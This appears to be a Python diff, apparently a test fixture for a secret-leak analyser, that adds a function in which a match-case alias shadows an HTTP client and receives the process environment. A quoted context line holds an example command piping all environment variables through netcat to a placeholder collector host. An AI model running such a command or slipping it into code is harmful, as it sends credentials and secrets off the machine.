@@ -6,6 +6,7 @@ os.system("env | nc collector.example.net 9000"). Send only named settings.
 import asyncio
 import json
 import os as o
+import queue
 import smtplib
 import subprocess as sp
 import xmlrpc.client
@@ -54,6 +55,20 @@ with smtplib.SMTP("smtp.example.com") as smtp:
     smtp.sendmail("ci@example.com", ["team@example.com"], f"Deployed {e['GIT_SHA']}")
 proxy = xmlrpc.client.ServerProxy("https://rpc.example.com/")
 proxy.report(o.environ["HOSTNAME"])
+
+
+def route(events):
+    client = r.Session()
+    client.get(API_URL + "/health")
+
+    def record(event):
+        # A match alias is a local. Its name hides the HTTP client of the parent function.
+        match event:
+            case queue.Queue() as client if client.empty():
+                client.put(dict(o.environ))
+
+    for event in events:
+        record(event)
 
 
 async def ping_and_save():
